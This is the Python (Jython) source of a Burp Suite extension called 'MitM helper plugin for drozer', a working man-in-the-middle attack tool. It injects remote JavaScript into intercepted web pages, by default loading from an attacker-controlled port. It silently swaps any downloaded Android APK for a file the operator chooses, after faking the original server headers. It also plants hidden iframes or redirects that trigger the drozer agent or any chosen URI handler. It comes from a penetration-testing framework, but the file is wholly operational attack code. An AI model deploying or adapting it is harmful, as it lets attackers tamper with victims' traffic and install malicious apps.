from burp import IBurpExtender
from burp import ITab
from burp import IHttpListener
from burp import IMessageEditorController
from javax import swing
import java.awt
from java import awt
from javax.swing.border import *
from java.io import PrintWriter
from java.util import ArrayList
from java.util import List
from javax.swing.table import AbstractTableModel
from threading import Lock
import re, os, httplib
from time import gmtime, strftime
from java.net import URL

class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController, AbstractTableModel):

    #
    # Evil global variables
    # Be ready to receive hate mail Tyrone & Daniel!
    #
    apkRequests = {}

    #
    # Executors
    #

    def injectPwn(self, messageInfo):
        
        # Get response
        response = messageInfo.getResponse()
        responseParsed = self._helpers.analyzeResponse(response)
        body = self._callbacks.getHelpers().bytesToString(response)[responseParsed.getBodyOffset():]
        headers = responseParsed.getHeaders()

        if not self.tools[2].getTickBoxTicked():
            # Method 1 - silent invocation - Inject iframe loading from pwn:// into responses (case insensitive) 
            changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<iframe src="pwn://lol" width=1 height=1 style="visibility:hidden;position:absolute"></iframe></body>', body)
        else:
            # Method 2 - active invocation - redirect to the pwn:// handler (this is a requirement for versions of Chromium >= 25)
            changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<script>window.location="pwn://www.google.com/pluginerror.html"</script></body>', body)


        changedContentBytes = self._callbacks.getHelpers().stringToBytes(changedContent)

        final = self._callbacks.getHelpers().buildHttpMessage(headers, changedContentBytes);

        # Set the response if the content changed and add to log
        if body != changedContent:
            messageInfo.setResponse(final)
            self.addLog(self._helpers.analyzeRequest(messageInfo).getUrl(), "Injected drozer invocation with pwn://")

        return

    def injectJs(self, messageInfo):
        
        # Get response
        response = messageInfo.getResponse()
        responseParsed = self._helpers.analyzeResponse(response)
        body = self._callbacks.getHelpers().bytesToString(response)[responseParsed.getBodyOffset():]
        headers = responseParsed.getHeaders()

        editBoxStr = str(self.tools[0].getEditBox())

        # Inject arbitrary script into responses
        changedContent = re.sub(re.compile(r'<head>', re.IGNORECASE), '<head><script src="' + editBoxStr + '"></script>', body)
        changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<script src="' + editBoxStr + '"></script></body>', changedContent)
        changedContent = re.sub(re.compile(r'<content>', re.IGNORECASE), '<content>&lt;script src=&quot;' + editBoxStr + '&quot;&gt;&lt;/script&gt;', changedContent)

        changedContentBytes = self._callbacks.getHelpers().stringToBytes(changedContent)
        final = self._callbacks.getHelpers().buildHttpMessage(headers, changedContentBytes);

        # Set the response if the content changed and add to log
        if body != changedContent:
            messageInfo.setResponse(final)
            self.addLog(self._helpers.analyzeRequest(messageInfo).getUrl(), "Injected JavaScript from " + editBoxStr)

        return

    def modifyAPKRequest(self, messageInfo):

        # Get requested path
        req = self._callbacks.getHelpers().analyzeRequest(messageInfo)
        reqUrl = req.getUrl()
        headers = list(req.getHeaders()) # convert to python list
        reqHost = reqUrl.getHost()
        reqPath = reqUrl.getPath()
        reqPort = reqUrl.getPort()

        # If it ends in .apk then change type to HEAD
        if reqPath.upper().endswith(".APK"):

            self.addLog(reqUrl, "Got request for APK...")

            # Determine whether an HTTP or HTTPS connection must be made
            if reqPort == 443:
                conn = httplib.HTTPSConnection(reqHost, reqPort)
            else:
                conn = httplib.HTTPConnection(reqHost, reqPort)

            # Get headers from user request
            httpLibHeaders = {}
            for i in headers:
                splitHeaders = i.split(": ")
                if len(splitHeaders) == 2:
                    httpLibHeaders[splitHeaders[0]] = splitHeaders[1]

            # Perform HEAD on target file from server using headers
            conn.request("HEAD", reqPath, headers=httpLibHeaders)
            response = conn.getresponse()
            responseHeaders = response.getheaders()

            # Add to information for use by injectAPK()
            version = ""
            if str(response.version) == "11":
                version = "HTTP/1.1"
            else:
                version = "HTTP/1.0"
            self.apkRequests[reqPath] = [reqUrl, version + " " + str(response.status) + " " + str(response.reason), responseHeaders]
            print self.apkRequests[reqPath]

            # Instead of passing request - change host to www.google.com which will be non existent
            httpService = messageInfo.getHttpService()
            messageInfo.setHttpService(self._callbacks.getHelpers().buildHttpService("www.google.com", httpService.getPort(), httpService.getProtocol()))

        return

    def injectAPK(self, messageInfo):

        # Get requested path
        req = self._callbacks.getHelpers().analyzeRequest(messageInfo)
        reqUrl = req.getUrl()
        reqHost = reqUrl.getHost()
        reqPath = reqUrl.getPath()
        reqPort = reqUrl.getPort()

        # If it ends in .apk then replace it!
        if reqPath.upper().endswith(".APK"):

            # Check this is a request we have seen
            if reqPath in self.apkRequests:

                # Get stored url and header
                res = self.apkRequests[reqPath]
                url = res[0]
                httpStatus = res[1]
                headers = []
                headers.append(httpStatus)
                for i in res[2]:
                    headers.append(i[0] + ': ' + ''.join(i[1:]))

                # Open and read APK from specified path
                f = open(self.tools[1].getEditBox())
                changedContentBytes = f.read()
                f.close()

                final = self._callbacks.getHelpers().buildHttpMessage(headers, changedContentBytes);
                
                # Replace response with new APK
                messageInfo.setResponse(final)
                self.addLog(url, "Replaced APK!")

        return

    def injectCustomURI(self, messageInfo):
        
        # Get response
        response = messageInfo.getResponse()
        responseParsed = self._helpers.analyzeResponse(response)
        body = self._callbacks.getHelpers().bytesToString(response)[responseParsed.getBodyOffset():]
        headers = responseParsed.getHeaders()

        uri = self.tools[3].getEditBox()

        if not self.tools[3].getTickBoxTicked():
            # Method 1 - silent invocation - Inject iframe loading from pwn:// into responses (case insensitive) 
            changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<iframe src="' + uri + '" width=1 height=1 style="visibility:hidden;position:absolute"></iframe></body>', body)
        else:
            # Method 2 - active invocation - redirect to the pwn:// handler (this is a requirement for versions of Chromium >= 25)
            changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<script>window.location="' + uri + '"</script></body>', body)

        changedContentBytes = self._callbacks.getHelpers().stringToBytes(changedContent)

        final = self._callbacks.getHelpers().buildHttpMessage(headers, changedContentBytes);

        # Set the response if the content changed and add to log
        if body != changedContent:
            messageInfo.setResponse(final)
            self.addLog(self._helpers.analyzeRequest(messageInfo).getUrl(), "Injected custom URI")

        return

    def nothing(self, messageInfo):
        pass


    #
    # implement IBurpExtender
    #
    
    def	registerExtenderCallbacks(self, callbacks):

        # Make available to whole class
        self._callbacks = callbacks
        
        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()
        
        # set our extension name
        callbacks.setExtensionName("MitM helper plugin for drozer")
        
        # create the log and a lock on which to synchronize when adding log entries
        self._log = ArrayList()
        self._lock = Lock()
        
        # Split pane
        self._splitpane = swing.JSplitPane(swing.JSplitPane.HORIZONTAL_SPLIT)

        # Create Tab
        topPanel = swing.JPanel()
        topPanel.setLayout(swing.BoxLayout(topPanel, swing.BoxLayout.Y_AXIS))

        # Define all tools
        self.tools = []
        self.tools.append(Tool(180, "JavaScript Injection", "Inject Remote JS into HTTP Responses", self.nothing, self.injectJs, "JS Location", "http://x.x.x.x:31415/dz.js"))
        self.tools.append(Tool(180, "APK Replacement", "Replace APK with specified one when requested", self.modifyAPKRequest, self.injectAPK, "APK Location", "", True))
        self.tools.append(Tool(170, "Invoke drozer using pwn://", "Inject code into HTTP Responses that invokes installed drozer agent", self.nothing, self.injectPwn, None, None, None, "Perform active invocation (required for Chromium >= 25)"))
        self.tools.append(Tool(220, "Custom URI Handler Injection", "Inject code into HTTP Responses that invokes specified URI handler", self.nothing, self.injectCustomURI, "URI", "pwn://me", None, "Perform active invocation (required for Chromium >= 25)"))

        # Add all tools to panel
        for i in self.tools:
            topPanel.add(i.getPanel())
        self._splitpane.setLeftComponent(topPanel)

        # table of log entries
        logTable = Table(self)
        logTable.setAutoResizeMode( swing.JTable.AUTO_RESIZE_ALL_COLUMNS );
        
        logTable.getColumn("Time").setPreferredWidth(120)
        logTable.getColumn("URL").setPreferredWidth(500)

        scrollPane = swing.JScrollPane(logTable)
        self._splitpane.setRightComponent(scrollPane)
        
        # customize our UI components
        callbacks.customizeUiComponent(self._splitpane)
        callbacks.customizeUiComponent(logTable)
        callbacks.customizeUiComponent(scrollPane)
        callbacks.customizeUiComponent(topPanel)
        
        # add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)
        
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
        
        return

    def addLog(self, url, action):
        self._lock.acquire()
        row = self._log.size()
        self._log.add(LogEntry(strftime("%Y-%m-%d %H:%M:%S", gmtime()), url, action))
        self.fireTableRowsInserted(row, row)
        self._lock.release()
        
    #
    # implement ITab
    #
    
    def getTabCaption(self):
        return "drozer"
    
    def getUiComponent(self):
        return self._splitpane
        
    #
    # implement IHttpListener
    #
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        
        # Execute all enabled tools
        for i in self.tools:
            if i.getButtonEnabled():
                if messageIsRequest:
                    i.getRequestExecutor()(messageInfo)
                else:
                    i.getResponseExecutor()(messageInfo)

    #
    # extend AbstractTableModel
    #
    
    def getRowCount(self):
        try:
            return self._log.size()
        except:
            return 0

    def getColumnCount(self):
        return 3

    def getColumnName(self, columnIndex):
        if columnIndex == 0:
            return "Time"
        if columnIndex == 1:
            return "URL"
        if columnIndex == 2:
            return "Action"
        return ""

    def getValueAt(self, rowIndex, columnIndex):
        logEntry = self._log.get(rowIndex)
        if columnIndex == 0:
            return logEntry._time
        if columnIndex == 1:
            return logEntry._url
        if columnIndex == 2:
            return logEntry._action
        return ""

#
# extend JTable to handle cell selection
#
    
class Table(swing.JTable):

    def __init__(self, extender):
        self._extender = extender
        self.setModel(extender)
        return
    
    def changeSelection(self, row, col, toggle, extend):
    
        logEntry = self._extender._log.get(row)
        swing.JTable.changeSelection(self, row, col, toggle, extend)
        return
    
#
# class to hold details of each log entry
#

class LogEntry:

    def __init__(self, time, url, action):
        self._time = time
        self._url = url
        self._action = action
        return
      
class Tool:

    def __init__(self, maxSizeY, title, description, requestExecutor, responseExecutor, editBoxLabel=None, editBox=None, browseButton=None, tickBox=None):

        self.title = title
        self.descriptionLabel = swing.JLabel(description)
        self.requestExecutor = requestExecutor
        self.responseExecutor = responseExecutor
        
        self.panel = swing.JPanel()
        self.panel.setLayout(swing.BoxLayout(self.panel, swing.BoxLayout.Y_AXIS))
        self.panel.setBorder(swing.BorderFactory.createTitledBorder(title))
        self.panel.setAlignmentX(awt.Component.LEFT_ALIGNMENT)
        self.panel.setMaximumSize(awt.Dimension(1000, maxSizeY))

        descriptionPanel = swing.JPanel()
        descriptionPanel.setLayout(swing.BoxLayout(descriptionPanel, swing.BoxLayout.X_AXIS))
        descriptionPanel.add(self.descriptionLabel)
        self._setBorder(descriptionPanel, 10, 10)
        self.panel.add(descriptionPanel)
        
        optionPanel = swing.JPanel()
        optionPanel.setLayout(swing.BoxLayout(optionPanel, swing.BoxLayout.X_AXIS))

        if editBox != None:

            self.editBox = swing.JTextField(editBox)
            self.editBox.setMaximumSize(awt.Dimension(1000, 30))

            optionPanel.add(swing.JLabel(editBoxLabel))
            optionPanel.add(self.editBox)

        if browseButton != None:
            self.browseButton = swing.JButton('Browse',actionPerformed=self.openBrowseDialog)
            optionPanel.add(self.browseButton)


        if editBox != None or browseButton != None:
            self._setBorder(optionPanel, 10, 10)
            self.panel.add(optionPanel)

        if tickBox != None:
            self.tickBox = swing.JCheckBox(tickBox)
            tickBoxPanel = swing.JPanel()
            tickBoxPanel.setLayout(swing.BoxLayout(tickBoxPanel, swing.BoxLayout.X_AXIS))
            tickBoxPanel.add(self.tickBox)
            self._setBorder(tickBoxPanel, 10, 10)
            self.panel.add(tickBoxPanel)

        enableButtonPanel = swing.JPanel()
        enableButtonPanel.setLayout(swing.BoxLayout(enableButtonPanel, swing.BoxLayout.X_AXIS))
        self.enableButton = swing.JToggleButton('Disabled', actionPerformed=self.toggle)
        enableButtonPanel.add(self.enableButton)
        self._setBorder(enableButtonPanel, 10, 10)
        self.panel.add(enableButtonPanel)

    def _setBorder(self, component, paddingX, paddingY):

        border = component.getBorder();
        margin = swing.border.EmptyBorder(paddingX, paddingY, paddingX, paddingY)
        component.setBorder(swing.border.CompoundBorder(border, margin))

    def toggle(self, button):
        if (self.enableButton.getText() == "Disabled"):
            self.enableButton.setText("Enabled")
        else:
            self.enableButton.setText("Disabled")

    def openBrowseDialog(self, button):
        dialog = swing.JFileChooser()
        c = dialog.showOpenDialog(None)
        if dialog is not None:
            if (dialog.currentDirectory and dialog.selectedFile.name) is not None:
                loc = str(dialog.currentDirectory) + os.sep + str(dialog.selectedFile.name)
                self.editBox.setText(loc)

    def getPanel(self):
        return self.panel

    def getEditBox(self):
        return self.editBox.getText()

    def getButtonEnabled(self):
        if (self.enableButton.getText() == "Disabled"):
            return False
        else:
            return True

    def getRequestExecutor(self):
        return self.requestExecutor

    def getResponseExecutor(self):
        return self.responseExecutor

    def getTickBoxTicked(self):
        return self.tickBox.isSelected()